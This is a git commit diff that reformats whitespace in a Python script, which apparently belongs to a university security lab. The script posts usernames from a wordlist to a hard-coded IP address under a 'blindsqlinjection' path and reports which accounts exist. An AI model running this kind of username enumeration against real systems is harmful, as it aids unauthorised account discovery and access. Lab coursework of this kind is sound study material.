ef75cd64ca3ca1de2b17b4e9447ac825388fe26e
Castro <aaron.castro@solera.com>
2020-11-21 22:29:46 +0100

    Syntax correction

--- M.1872/PRA/extract0r.py
+++ M.1872/PRA/extract0r.py
@@ -3,18 +3,18 @@
 This program uses a dictionary file to check common usernames with access
 """
 
-__author__ = "Aaron Castro"
-__author_email__ = "aaron.castro.sanchez@outlook.com"
-__copyright__ = "Aaron Castro"
-__license__ = "MIT"
+__author__="Aaron Castro"
+__author_email__="aaron.castro.sanchez@outlook.com"
+__copyright__="Aaron Castro"
+__license__="MIT"
 
 import requests, re
 
-req = requests.session()
-url = 'http://84.88.58.172/UOC/Alumnos/blindsqlinjection/'
+req=requests.session()
+url='http://84.88.58.172/UOC/Alumnos/blindsqlinjection/'
 
 def remove_html(html):
-    clean = re.compile('<.*?>')
+    clean=re.compile('<.*?>')
     return re.sub(clean, '', html)
 
 def look_for_exitcode(html):
@@ -23,12 +23,12 @@ def look_for_exitcode(html):
     else:
         return(False)
 
-if __name__ == "__main__":
+if __name__=="__main__":
     with open('usuarios.txt') as file:
-        lines = file.readlines()
+        lines=file.readlines()
 
     for line in lines: 
-        payload = {'usuario': line.strip()}
-        r = requests.post(url, data = payload)
-        if look_for_exitcode(remove_html(r.text)) == True:
+        payload={'usuario': line.strip()}
+        r=requests.post(url, data=payload)
+        if look_for_exitcode(remove_html(r.text))==True:
             print('User ' + line.strip() + ' exists')
